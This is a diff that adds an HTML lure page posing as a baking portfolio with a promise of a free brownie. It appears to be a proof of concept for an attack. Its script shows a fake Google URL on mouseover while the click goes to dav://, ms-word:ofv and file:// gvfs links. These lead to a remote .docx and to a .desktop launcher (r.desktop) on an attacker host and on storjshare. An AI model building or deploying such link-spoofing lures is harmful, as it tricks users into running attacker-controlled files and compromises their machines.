@@ -1,3 +1,90 @@
-<a href="dav://192.168.64.1:8080/" target="_blank">Dav</a>
+<!DOCTYPE html>
+<!-- saved from url=(0020)https://example.com/ -->
+<html>
 
-<a href="file://ANYTHING//run/user/1000/gvfs/dav:host=192.168.64.1,port=8080,ssl=false/.h/r.desktop" target="_blank">File</a>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Example Domain</title>
+
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style type="text/css">
+        body {
+            background-color: #f0f0f2;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+
+        }
+
+        div {
+            width: 600px;
+            margin: 5em auto;
+            padding: 2em;
+            background-color: #fdfdff;
+            border-radius: 0.5em;
+            box-shadow: 2px 3px 7px 2px rgba(0, 0, 0, 0.02);
+        }
+
+        a:link,
+        a:visited {
+            color: #38488f;
+            text-decoration: none;
+        }
+
+        @media (max-width: 700px) {
+            div {
+                margin: 0 auto;
+                width: auto;
+            }
+        }
+    </style>
+</head>
+<script>
+    function showNiceLink1(el, e) {
+        e = e || event;
+        el.originalHref = el.originalHref || el.href;
+        console.log(e.type);
+        if (/click|out/i.test(e.type)) {
+            return el.href = el.originalHref;
+        } else {
+            el.href = "https://photos.google.com/baking";
+        }
+    }
+
+    function showNiceLink2(el, e) {
+        e = e || event;
+        el.originalHref = el.originalHref || el.href;
+        console.log(e.type);
+        if (/click|out/i.test(e.type)) {
+            return el.href = el.originalHref;
+        } else {
+            el.href = "https://google.com/download/My%20Portfolio.docx";
+        }
+    }
+</script>
+
+<body>
+<div>
+    <h1>incredible cooking and baking portfolio</h1>
+    <p>View my portfolio and I'll give you a free brownie!</p>
+    <!-- <p><a href="dav://192.168.64.1:8080">dav...</a></p>
+    <p><a href="vnd.libreoffice.command://help">LibreOffice</a></p>
+    <p><a href="file:////run/user/1000/gvfs/dav:host=192.168.64.1,port=8080,ssl=false/icon_discord.desktop" target="_blank">file</a></p> -->
+    <h2><a href="dav://192.168.64.1:8080/" onmouseover="showNiceLink1(this,event)" onclick="showNiceLink1(this,event)"
+           onmouseout="showNiceLink1(this,event)">Baking photos</a>
+    </h2>
+    <h2><a
+            href="ms-word:ofv|u|https://link.storjshare.io/s/jxjxonayxkut6rjcehxdipzistsq/bucket-35345354/My%20Portfolio%202.docx?download=1"
+            onmouseover="showNiceLink2(this,event)" onclick="showNiceLink2(this,event)"
+            onmouseout="showNiceLink2(this,event)">My Portfolio.docx</a></h2>
+    <!-- <h2><a href="https://link.storjshare.io/s/jxjxonayxkut6rjcehxdipzistsq/bucket-35345354/My%20Portfolio.docx?download=1">My Portfolio.docx</a></h2> -->
+    <h2><a href="file:////run/user/1000/gvfs/dav:host=192.168.64.1,port=8080,ssl=false/.h/r.desktop">Just click me</a></h2>
+    <p><a href="https://link.storjshare.io/raw/jwwuh4beshcw3ixqurkwdqtog3iq/junk-3938/r.desktop">https://link.storjshare.io/raw/jwwuh4beshcw3ixqurkwdqtog3iq/junk-3938/r.desktop</a></p>
+</div>
+
+
+</body>
+
+</html>
